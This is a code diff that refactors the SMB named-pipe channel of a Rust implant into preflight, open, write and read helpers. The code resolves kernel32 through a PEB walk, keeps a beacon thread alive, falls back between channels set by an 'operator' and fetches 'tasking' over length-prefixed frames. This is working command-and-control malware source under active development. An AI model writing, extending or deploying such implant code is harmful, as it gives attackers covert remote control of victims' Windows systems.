@@ -203,6 +203,31 @@ fn to_utf16(s: &[u8]) -> Vec<u16> {
 /// Resolves and invokes kernel32 function pointers via PEB walk; all pointer
 /// arguments point into the implant's own stack/heap buffers.
 pub unsafe fn send_recv(ctx: &ChannelCtx, frame: &[u8]) -> Option<Vec<u8>> {
+    let fns = match send_recv_preflight(ctx) {
+        Some(f) => f,
+        None => return None,
+    };
+    let handle = match send_recv_open_pipe(fns, ctx.smb_pipe_name.as_bytes()) {
+        Some(h) => h,
+        None => return None,
+    };
+
+    // Guard: ensure the handle is closed on every return path below. We inline
+    // the close before each `return` because the bump allocator has no Drop and
+    // a RAII guard would need a closure-return pattern that's awkward in no_std.
+    // (Same explicit-close discipline transport.rs uses for WinHTTP handles.)
+    if !send_recv_write(fns, handle, frame) {
+        unsafe { (fns.close_handle)(handle) };
+        crate::entry::diag_mark(b"ERR_CH_SMB_WRITE");
+        return None;
+    }
+    send_recv_read(fns, handle)
+}
+
+/// Preflight: pipe configured + kernel32 table resolved. Returns the resolved
+/// function table, or None (with the appropriate diag mark) when the channel is
+/// unavailable.
+unsafe fn send_recv_preflight(ctx: &ChannelCtx) -> Option<&'static K32Fns> {
     // No pipe configured → channel unavailable (operator hasn't issued
     // SetChannel with an SMB pipe name). Bail cleanly so the dispatcher falls
     // through to the next fallback channel.
@@ -222,16 +247,19 @@ pub unsafe fn send_recv(ctx: &ChannelCtx, frame: &[u8]) -> Option<Vec<u8>> {
         return None;
     }
     // SAFETY: pointer was stored by ensure_k32 via Box::leak; process-lifetime.
-    let fns = unsafe { &*(ptr as *const K32Fns) };
-    let close = fns.close_handle;
+    Some(unsafe { &*(ptr as *const K32Fns) })
+}
 
+/// Open the named pipe, bounded: WaitNamedPipeW on ERROR_PIPE_BUSY, retry once,
+/// then give up. Returns None when the pipe isn't there (ERR_CH_SMB_OPEN).
+unsafe fn send_recv_open_pipe(fns: &K32Fns, pipe_name: &[u8]) -> Option<Handle> {
     // ---- Open the named pipe (bounded: WaitNamedPipeW on ERROR_PIPE_BUSY) ----
     // Connect phase deadline contract (implant-channels-3):
     //  - pipe missing (ERROR_FILE_NOT_FOUND) → fail fast (dead peer);
     //  - pipe busy (ERROR_PIPE_BUSY, server hasn't accepted yet) → wait up to
     //    PIPE_WAIT_MS via WaitNamedPipeW, retry once, then give up. A wedged
     //    pipe server can no longer hold the single beacon thread indefinitely.
-    let wide = to_utf16(ctx.smb_pipe_name.as_bytes());
+    let wide = to_utf16(pipe_name);
     let mut handle = unsafe {
         (fns.create_file_w)(
             wide.as_ptr(),
@@ -267,12 +295,12 @@ pub unsafe fn send_recv(ctx: &ChannelCtx, frame: &[u8]) -> Option<Vec<u8>> {
         crate::entry::diag_mark(b"ERR_CH_SMB_OPEN");
         return None;
     }
+    Some(handle)
+}
 
-    // Guard: ensure the handle is closed on every return path below. We inline
-    // the close before each `return` because the bump allocator has no Drop and
-    // a RAII guard would need a closure-return pattern that's awkward in no_std.
-    // (Same explicit-close discipline transport.rs uses for WinHTTP handles.)
-
+/// Write phase: [4-byte LE len][frame]. Returns false when a WriteFile fails —
+/// the caller closes the handle and reports a transport error.
+unsafe fn send_recv_write(fns: &K32Fns, handle: Handle, frame: &[u8]) -> bool {
     // ---- Write phase: [4-byte LE len][frame] ----
     let len = frame.len() as u32;
     let prefix = len.to_le_bytes();
@@ -283,13 +311,15 @@ pub unsafe fn send_recv(ctx: &ChannelCtx, frame: &[u8]) -> Option<Vec<u8>> {
     if sent_all && !write_all(fns, handle, frame) {
         sent_all = false;
     }
-    if !sent_all {
-        unsafe { close(handle) };
-        crate::entry::diag_mark(b"ERR_CH_SMB_WRITE");
-        return None;
-    }
+    sent_all
+}
 
+/// Read phase: [4-byte LE len][payload]. Rejects absurd length prefixes
+/// (MAX_FRAME cap), closes the handle on every path, and returns the response
+/// payload (possibly empty — a valid "no tasking" reply).
+unsafe fn send_recv_read(fns: &K32Fns, handle: Handle) -> Option<Vec<u8>> {
     // ---- Read phase: [4-byte LE len][payload] ----
+    let close = fns.close_handle;
     let mut prefix_buf = [0u8; 4];
     if !read_exact(fns, handle, &mut prefix_buf) {
         unsafe { close(handle) };
